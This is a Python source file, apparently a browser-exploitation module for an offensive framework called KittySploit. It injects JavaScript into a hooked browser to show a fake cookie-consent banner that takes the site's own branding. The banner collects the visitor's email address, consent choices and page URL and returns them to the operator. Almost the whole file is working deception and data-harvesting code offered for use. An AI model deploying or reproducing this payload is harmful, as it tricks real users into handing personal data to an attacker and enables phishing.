from kittysploit import *
import json
import uuid


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Fake Cookie Consent",
		"description": "Display a fake GDPR/cookie consent banner that harvests email and consent choices",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	brand = OptString("", "Brand override (empty = hostname)", False)
	ask_email = OptBool(True, "Include email field (newsletter / updates)", False)
	position = OptString("bottom", "Banner position: bottom | modal", False)
	timeout = OptInteger(45, "Seconds to wait for interaction", False)
	theme = OptString("light", "Theme: light | dark", False)

	def run(self):
		brand = str(self.brand or "").strip()
		ask_email = self._to_bool(self.ask_email)
		position = str(self.position or "bottom").strip().lower()
		if position not in ("bottom", "modal"):
			position = "bottom"
		timeout_s = max(5, int(self.timeout or 45))
		theme = str(self.theme or "light").strip().lower()
		if theme not in ("light", "dark"):
			theme = "light"
		job_id = str(uuid.uuid4())[:8]

		code_js = f"""
		(function() {{
			const BRAND = {json.dumps(brand)};
			const ASK_EMAIL = {str(ask_email).lower()};
			const POSITION = {json.dumps(position)};
			const THEME = {json.dumps(theme)};
			const TIMEOUT_MS = {timeout_s * 1000};
			const JOB = {json.dumps(job_id)};

			const existing = document.getElementById('ks-cookie-consent');
			if (existing) existing.remove();

			const dark = THEME === 'dark';
			const c = dark ? {{
				bg: '#0f172a', text: '#f8fafc', muted: '#94a3b8', border: '#1e293b',
				accent: '#3b82f6', panel: 'rgba(2,6,23,.72)'
			}} : {{
				bg: '#ffffff', text: '#0f172a', muted: '#64748b', border: '#e2e8f0',
				accent: '#2563eb', panel: 'rgba(15,23,42,.45)'
			}};

			return new Promise(function(resolve) {{
				let finished = false;
				function done(payload) {{
					if (finished) return;
					finished = true;
					try {{ root.remove(); }} catch (e) {{}}
					resolve(JSON.stringify(payload));
				}}

				const root = document.createElement('div');
				root.id = 'ks-cookie-consent';
				root.style.cssText = POSITION === 'modal'
					? 'position:fixed;inset:0;z-index:2147483647;background:' + c.panel +
					  ';display:flex;align-items:center;justify-content:center;font-family:system-ui,sans-serif;'
					: 'position:fixed;left:0;right:0;bottom:0;z-index:2147483647;padding:16px;font-family:system-ui,sans-serif;';

				const card = document.createElement('div');
				card.style.cssText = (POSITION === 'modal'
					? 'width:min(480px,92vw);'
					: 'max-width:960px;margin:0 auto;') +
					'background:' + c.bg + ';color:' + c.text + ';border:1px solid ' + c.border +
					';border-radius:14px;padding:20px 22px;box-shadow:0 18px 40px rgba(0,0,0,.28);';

				const brandEl = document.createElement('div');
				brandEl.style.cssText = 'font-size:12px;font-weight:700;letter-spacing:.04em;text-transform:uppercase;color:' + c.muted + ';margin-bottom:6px;';
				brandEl.textContent = BRAND || (location.hostname || 'Privacy Center');

				const title = document.createElement('div');
				title.style.cssText = 'font-size:18px;font-weight:700;margin-bottom:8px;';
				title.textContent = 'We value your privacy';

				const body = document.createElement('p');
				body.style.cssText = 'margin:0 0 14px;font-size:13px;line-height:1.5;color:' + c.muted + ';';
				body.textContent = 'We use cookies to improve your experience, analyze traffic, and show personalized content. You can accept all cookies or manage preferences.';

				const prefs = document.createElement('div');
				prefs.style.cssText = 'display:flex;flex-wrap:wrap;gap:12px 18px;margin-bottom:14px;font-size:13px;';

				function check(label, name, checked, disabled) {{
					const lab = document.createElement('label');
					lab.style.cssText = 'display:flex;align-items:center;gap:6px;cursor:pointer;';
					const input = document.createElement('input');
					input.type = 'checkbox';
					input.name = name;
					input.checked = !!checked;
					input.disabled = !!disabled;
					lab.appendChild(input);
					lab.appendChild(document.createTextNode(label));
					prefs.appendChild(lab);
					return input;
				}}

				const necessary = check('Necessary', 'necessary', true, true);
				const analytics = check('Analytics', 'analytics', true, false);
				const marketing = check('Marketing', 'marketing', false, false);

				let emailInput = null;
				if (ASK_EMAIL) {{
					const emailWrap = document.createElement('label');
					emailWrap.style.cssText = 'display:flex;flex-direction:column;gap:6px;font-size:13px;font-weight:600;margin-bottom:14px;';
					emailWrap.textContent = 'Email for privacy updates (optional)';
					emailInput = document.createElement('input');
					emailInput.type = 'email';
					emailInput.placeholder = 'you@company.com';
					emailInput.autocomplete = 'email';
					emailInput.style.cssText = 'padding:10px 12px;border-radius:8px;border:1px solid ' + c.border +
						';background:transparent;color:' + c.text + ';font-weight:400;';
					emailWrap.appendChild(emailInput);
					card.appendChild(brandEl);
					card.appendChild(title);
					card.appendChild(body);
					card.appendChild(prefs);
					card.appendChild(emailWrap);
				}} else {{
					card.appendChild(brandEl);
					card.appendChild(title);
					card.appendChild(body);
					card.appendChild(prefs);
				}}

				const row = document.createElement('div');
				row.style.cssText = 'display:flex;flex-wrap:wrap;gap:8px;justify-content:flex-end;';

				function collect(action) {{
					return {{
						ok: true,
						submitted: true,
						action: action,
						job: JOB,
						page_url: location.href,
						brand: brandEl.textContent,
						email: emailInput ? (emailInput.value || null) : null,
						preferences: {{
							necessary: !!necessary.checked,
							analytics: !!analytics.checked,
							marketing: !!marketing.checked
						}},
						ts: new Date().toISOString()
					}};
				}}

				function btn(label, primary, action) {{
					const b = document.createElement('button');
					b.type = 'button';
					b.textContent = label;
					b.style.cssText = primary
						? 'padding:10px 14px;border:0;border-radius:8px;background:' + c.accent + ';color:#fff;font-weight:600;cursor:pointer;'
						: 'padding:10px 14px;border:1px solid ' + c.border + ';border-radius:8px;background:transparent;color:' + c.text + ';cursor:pointer;';
					b.onclick = function() {{ done(collect(action)); }};
					row.appendChild(b);
				}}

				btn('Reject non-essential', false, 'reject');
				btn('Save preferences', false, 'custom');
				btn('Accept all', true, 'accept_all');

				card.appendChild(row);
				root.appendChild(card);
				document.documentElement.appendChild(root);

				setTimeout(function() {{
					done({{
						ok: true,
						submitted: false,
						timeout: true,
						job: JOB,
						page_url: location.href
					}});
				}}, TIMEOUT_MS);
			}});
		}})();
		"""

		print_status(f"Showing fake cookie consent ({position}, wait {timeout_s}s)...")
		result = self.send_js_and_wait_for_response(code_js, timeout=float(timeout_s + 15))
		if not result:
			print_error("Failed to run fake cookie consent")
			return False
		if isinstance(result, str) and result.startswith("Error:"):
			print_error(result)
			return False

		try:
			data = json.loads(result)
		except json.JSONDecodeError as exc:
			print_error(f"Failed to parse response: {exc}")
			return False

		print_info("=" * 60)
		print_info("Fake Cookie Consent")
		print_info(f"  Page: {data.get('page_url')}")

		if data.get("submitted"):
			print_success(f"Action: {data.get('action')}")
			prefs = data.get("preferences") or {}
			print_info(
				f"  Prefs: necessary={prefs.get('necessary')} "
				f"analytics={prefs.get('analytics')} marketing={prefs.get('marketing')}"
			)
			if data.get("email"):
				print_warning(f"  Email: {data.get('email')}")
			return True

		if data.get("timeout"):
			print_status("Timed out waiting for consent interaction")
			return True

		print_info(json.dumps(data, indent=2))
		return True
